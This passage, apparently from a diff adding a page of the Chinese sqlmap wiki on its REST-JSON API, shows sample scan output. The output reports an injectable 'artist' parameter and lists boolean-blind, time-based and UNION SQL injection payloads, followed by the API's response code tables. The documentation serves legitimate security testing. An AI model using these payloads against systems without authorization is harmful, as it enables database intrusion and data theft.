+            &quot;message&quot;: &quot;testing &apos;Generic UNION query (NULL) - 1 to 20 columns&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:23&quot;
+        },
+        {
+            &quot;message&quot;: &quot;automatically extending ranges for UNION query injection
+ technique tests as there is at least one other (potential) technique found&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:23&quot;
+        },
+        {
+            &quot;message&quot;: &quot;&apos;ORDER BY&apos; technique appears to be usable. This should r
+educe the time needed to find the right number of query columns. Automatically e
+xtending the range for current UNION query injection technique test&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:23&quot;
+        },
+        {
+            &quot;message&quot;: &quot;target URL appears to have 3 columns in query&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:23&quot;
+        },
+        {
+            &quot;message&quot;: &quot;GET parameter &apos;artist&apos; is &apos;Generic UNION query (NULL) -
+1 to 20 columns&apos; injectable&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:24&quot;
+        },
+        {
+            &quot;message&quot;: &quot;the back-end DBMS is MySQL&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:24&quot;
+        },
+        {
+            &quot;message&quot;: &quot;fetching banner&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:24&quot;
+        }
+    ],
+    &quot;success&quot;: true
+}
+api (a42ddaef02e976f0)&gt; data
+[12:48:59] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/data
+{
+    &quot;data&quot;: [
+        {
+            &quot;status&quot;: 1,
+            &quot;type&quot;: 0,
+            &quot;value&quot;: [
+                {
+                    &quot;dbms&quot;: &quot;MySQL&quot;,
+                    &quot;suffix&quot;: &quot;&quot;,
+                    &quot;clause&quot;: [
+                        1,
+                        9
+                    ],
+                    &quot;notes&quot;: [],
+                    &quot;ptype&quot;: 1,
+                    &quot;dbms_version&quot;: [
+                        &quot;&gt;= 5.0.12&quot;
+                    ],
+                    &quot;prefix&quot;: &quot;&quot;,
+                    &quot;place&quot;: &quot;GET&quot;,
+                    &quot;os&quot;: null,
+                    &quot;conf&quot;: {
+                        &quot;code&quot;: null,
+                        &quot;string&quot;: &quot;hac&quot;,
+                        &quot;notString&quot;: null,
+                        &quot;titles&quot;: false,
+                        &quot;regexp&quot;: null,
+                        &quot;textOnly&quot;: false,
+                        &quot;optimize&quot;: false
+                    },
+                    &quot;parameter&quot;: &quot;artist&quot;,
+                    &quot;data&quot;: {
+                        &quot;1&quot;: {
+                            &quot;comment&quot;: &quot;&quot;,
+                            &quot;matchRatio&quot;: 0.85,
+                            &quot;trueCode&quot;: 200,
+                            &quot;title&quot;: &quot;AND boolean-based blind - WHERE or HAVING
+clause&quot;,
+                            &quot;templatePayload&quot;: null,
+                            &quot;vector&quot;: &quot;AND [INFERENCE]&quot;,
+                            &quot;falseCode&quot;: 200,
+                            &quot;where&quot;: 1,
+                            &quot;payload&quot;: &quot;artist=1 AND 2794=2794&quot;
+                        },
+                        &quot;5&quot;: {
+                            &quot;comment&quot;: &quot;&quot;,
+                            &quot;matchRatio&quot;: 0.85,
+                            &quot;trueCode&quot;: 200,
+                            &quot;title&quot;: &quot;MySQL &gt;= 5.0.12 AND time-based blind&quot;,
+                            &quot;templatePayload&quot;: null,
+                            &quot;vector&quot;: &quot;AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLE
+EPTIME]),[RANDNUM])&quot;,
+                            &quot;falseCode&quot;: null,
+                            &quot;where&quot;: 1,
+                            &quot;payload&quot;: &quot;artist=1 AND SLEEP([SLEEPTIME])&quot;
+                        },
+                        &quot;6&quot;: {
+                            &quot;comment&quot;: &quot;[GENERIC_SQL_COMMENT]&quot;,
+                            &quot;matchRatio&quot;: 0.85,
+                            &quot;trueCode&quot;: null,
+                            &quot;title&quot;: &quot;Generic UNION query (NULL) - 1 to 20 colum
+ns&quot;,
+                            &quot;templatePayload&quot;: null,
+                            &quot;vector&quot;: [
+                                2,
+                                3,
+                                &quot;[GENERIC_SQL_COMMENT]&quot;,
+                                &quot;&quot;,
+                                &quot;&quot;,
+                                &quot;NULL&quot;,
+                                2,
+                                false,
+                                false
+                            ],
+                            &quot;falseCode&quot;: null,
+                            &quot;where&quot;: 2,
+                            &quot;payload&quot;: &quot;artist=-5376 UNION ALL SELECT NULL,NULL,
+CONCAT(0x716b706a71,0x4a754d495377744d4273616c436b4b6a504164666a5572477241596649
+704c68614672644a477474,0x7162717171)-- aAjy&quot;
+                        }
+                    }
+                }
+            ]
+        },
+        {
+            &quot;status&quot;: 1,
+            &quot;type&quot;: 2,
+            &quot;value&quot;: &quot;5.1.73-0ubuntu0.10.04.1&quot;
+        }
+    ],
+    &quot;success&quot;: true,
+    &quot;error&quot;: []
+}
+api (a42ddaef02e976f0)&gt; exit
+$
+</code></pre>
+<p>General codes used in response JSON data:</p>
+<p>&#x54CD;&#x5E94;&#x4E2D;&#x7684; JSON &#x6570;&#x636E;&#x901A;&#x7528;&#x7801;&#xFF1A;</p>
+<ul>
+<li><p><code>status</code>:</p>
+<pre><code class="lang-txt">  0 - in progress
+  1 - complete
+</code></pre>
+</li>
+<li><p><code>type</code>:</p>
+<pre><code class="lang-txt">  0 - target
+  1 - techniques
+  2 - dbms_fingerprint
+  3 - banner
+  4 - current_user
+  5 - current_db
+  6 - hostname
+  7 - is_dba
+  8 - users
+  9 - passwords
+  10 - privileges
+  11 - roles
+  12 - dbs
+  13 - tables
+  14 - columns
+  15 - schema
+  16 - count
+  17 - dump_table
+  18 - search
+  19 - sql_query
+  20 - common_tables
+  21 - common_columns
+  22 - file_read
+  23 - file_write
+  24 - os_cmd
+  25 - reg_read
+  26 - statements
+</code></pre>
+</li>
+<li><p><code>returncode</code></p>
+<pre><code class="lang-txt">  null - still running
+  0 - ended gracefully
+  1 - general error occurred
+  255 - unhandled exception
+</code></pre>
+</li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="Miscellaneous.html" class="navigation navigation-prev " aria-label="Previous page: 杂项">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../License.html" class="navigation navigation-next " aria-label="Next page: 许可证">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"API（REST-JSON）","level":"2.8.17","depth":2,"next":{"title":"许可证","level":"2.9","depth":1,"path":"Users-manual/License.md","ref":"Users-manual/License.md","articles":[]},"previous":{"title":"杂项","level":"2.8.16","depth":2,"path":"Users-manual/Usage/Miscellaneous.md","ref":"Users-manual/Usage/Miscellaneous.md","articles":[]},"dir":"ltr"},"config":{"plugins":[],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"path":{"toc":"SUMMARY.md"},"theme":"default","name":"sqlmap-wiki-zhcn","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"introduction":"最新的 sqlmap wiki 中文版。","gitbook":"*"},"file":{"path":"Users-manual/Usage/API.md","mtime":"2023-11-12T07:55:51.437Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-11-12T07:56:17.655Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
